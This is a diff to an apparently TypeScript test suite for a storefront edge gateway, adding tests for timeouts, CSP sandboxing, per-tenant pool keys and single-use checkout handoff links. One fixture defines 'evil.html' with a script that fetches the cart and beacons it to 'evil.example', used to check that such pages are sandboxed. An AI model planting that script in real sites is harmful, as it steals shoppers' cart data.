@@ -39,6 +39,8 @@ beforeAll(async () => {
   v1 = (
     await buildArtifact(root, "theme", hostileTheme("v1"), {
       "_astro/app.v1.js": "console.log(1)",
+      "evil.html":
+        '<script>fetch("/_p/cart").then((r) => r.text()).then((t) => navigator.sendBeacon("https://evil.example", t))</script>',
       "favicon.svg": "<svg/>",
     })
   ).id;
@@ -186,6 +188,18 @@ describe("header hygiene (A2)", () => {
     expect(res.headers.get("x-edge-subrequests")).toBe("52");
   });
 
+  test("a never-ending body times out (504) and an oversized one is cut off (502)", async () => {
+    expect((await get("http://demo.localhost/c/endless")).status).toBe(504);
+    expect((await get("http://demo.localhost/c/huge")).status).toBe(502);
+    expect(gw.registry.size).toBe(0);
+  });
+
+  test("packed documents are served sandboxed, so they cannot bypass the edge CSP", async () => {
+    const res = await get("http://demo.localhost/evil.html");
+    expect(res.headers.get("content-security-policy")).toContain("sandbox");
+    expect(res.headers.get("content-security-policy")).toContain("default-src 'none'");
+  });
+
   test("a hanging render times out with 504", async () => {
     expect((await get("http://demo.localhost/c/slow")).status).toBe(504);
   });
@@ -292,11 +306,11 @@ describe("artifacts: assets, publish, rollback, eviction, restart (A22)", () => 
 
   test("an evicted instance is recreated on the next request", async () => {
     await get("http://demo.localhost/p/theme-no-store");
-    expect(gw.pool.has(v1)).toBe(true);
+    expect(gw.pool.has(v1, "t-demo")).toBe(true);
     await gw.pool.evict(v1);
-    expect(gw.pool.has(v1)).toBe(false);
+    expect(gw.pool.has(v1, "t-demo")).toBe(false);
     expect((await get("http://demo.localhost/p/theme-no-store")).status).toBe(200);
-    expect(gw.pool.has(v1)).toBe(true);
+    expect(gw.pool.has(v1, "t-demo")).toBe(true);
     await gw.pool.evictIdle(0);
     expect(gw.pool.size).toBe(0);
   });
@@ -312,6 +326,7 @@ describe("artifacts: assets, publish, rollback, eviction, restart (A22)", () => 
 describe("cart capability and checkout handoff (A1, A4)", () => {
   const shop = "http://demo.localhost:8280";
   const origin = { origin: shop };
+  const sameSite = { "sec-fetch-site": "same-site" };
 
   test("state-changing /_p requests must be same-origin", async () => {
     const res = await get(
@@ -381,17 +396,22 @@ describe("cart capability and checkout handoff (A1, A4)", () => {
       /^http:\/\/checkout\.demo\.localhost:8280\/start\?h=[A-Za-z0-9_-]{43}$/,
     );
     expect(start.headers.get("cache-control")).toBe("no-store");
+    expect(start.headers.get("set-cookie")).toMatch(/^cart=; Path=\/_p; .*Max-Age=0$/); // rotated
 
     // Wrong host cannot redeem it.
     const h = new URL(location).searchParams.get("h");
-    const exchanged = await get(location);
+    // Planted links (cross-site) and pasted/mail links (none) cannot redeem, and do not burn it.
+    expect((await get(location, { "sec-fetch-site": "cross-site" })).status).toBe(400);
+    expect((await get(location, { "sec-fetch-site": "none" })).status).toBe(400);
+    expect((await get(location)).status).toBe(400);
+    const exchanged = await get(location, sameSite);
     expect(exchanged.status).toBe(303);
     expect(exchanged.headers.get("location")).toBe("/");
     expect(exchanged.headers.get("set-cookie")).toBe(
       "__Host-cart=checkouttoken_000000000001; Path=/; HttpOnly; Secure; SameSite=Lax",
     );
-    expect((await get(location)).status).toBe(400); // single use
-    expect((await get(`http://checkout.other.localhost/start?h=${h}`)).status).toBe(400);
+    expect((await get(location, sameSite)).status).toBe(400); // single use
+    expect((await get(`http://checkout.other.localhost/start?h=${h}`, sameSite)).status).toBe(400);
 
     // The checkout app reads the cart through its own binding with the checkout-scoped token.
     api.calls.length = 0;
